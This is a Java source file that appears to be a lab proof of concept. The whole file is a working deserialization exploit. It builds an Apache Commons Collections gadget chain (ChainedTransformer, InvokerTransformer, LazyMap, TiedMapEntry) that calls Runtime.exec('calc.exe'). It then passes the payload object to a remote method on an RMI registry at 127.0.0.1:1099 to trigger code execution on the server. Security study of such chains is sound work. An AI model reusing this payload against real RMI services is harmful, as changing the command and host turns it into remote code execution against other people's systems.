package com.lingx5.RMI;

import com.lingx5.Calculator;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;

public class c2sExp {
    public static void main(String[] args) throws Exception{
        Transformer[] transforms = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(),new ConstantTransformer(null));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"lingx5");
        HashMap<Object, Object> HashMap = new HashMap<>();
        HashMap.put(tiedMapEntry,"lingx5");
        Field factory = LazyMap.class.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);
        lazyMap.remove("lingx5");
        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1099);
        Calculator calculator = (Calculator) registry_remote.lookup("caculator");
        calculator.sayGood(HashMap);


    }
}
